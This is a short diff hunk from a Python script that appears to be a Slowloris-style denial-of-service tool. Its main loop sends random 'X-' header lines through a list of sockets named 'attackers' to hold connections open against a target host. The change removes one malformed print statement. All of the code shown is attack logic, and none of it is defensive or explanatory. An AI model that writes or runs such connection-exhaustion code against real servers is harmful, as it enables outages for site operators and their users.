@@ -132,7 +132,6 @@ def main():
     while True:
         try:
             logging.info("\033[38;5;220mGet \033[36m{} \033[37mResponse: \033[33m{}\033[0m".format(host, connections))
-            print("\033[48;5;6m[%(asctime)s] %(message)s", datefmt="%H:%M:%S", format(logging.INFO))
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
